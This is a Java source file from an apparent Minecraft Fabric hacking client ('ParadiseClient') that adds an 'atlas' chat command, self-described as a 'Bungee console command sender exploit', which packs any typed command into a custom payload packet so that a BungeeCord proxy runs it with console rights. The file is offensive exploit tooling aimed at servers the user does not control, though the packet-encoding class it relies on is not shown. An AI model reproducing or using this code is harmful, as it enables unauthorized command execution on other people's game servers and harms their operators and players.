package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.network.packet.Packet;
import net.minecraft.server.command.ServerCommandSource;

public class BungeeConsole extends Command {
    public BungeeConsole(MinecraftClient minecraftClient) {
        super("atlas", "Bungee console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<ServerCommandSource> build() {
        return LiteralArgumentBuilder.<ServerCommandSource>literal(this.getName())
                .executes(context -> {
                    Helper.printChatMessage("Incomplete command!");
                    return 1;
                })
                .then(com.mojang.brigadier.builder.RequiredArgumentBuilder
                        .<ServerCommandSource, String>argument("command", StringArgumentType.greedyString())
                        .executes(this::build)
                );
    }

    private int build(CommandContext<?> context) {
        String command = StringArgumentType.getString(context, "command");
        Helper.sendPacket(new CustomPayloadC2SPacket(new BungeeCommandWriter(command)));
        Helper.printChatMessage("Payload sent!");
        return 1;
    }
}
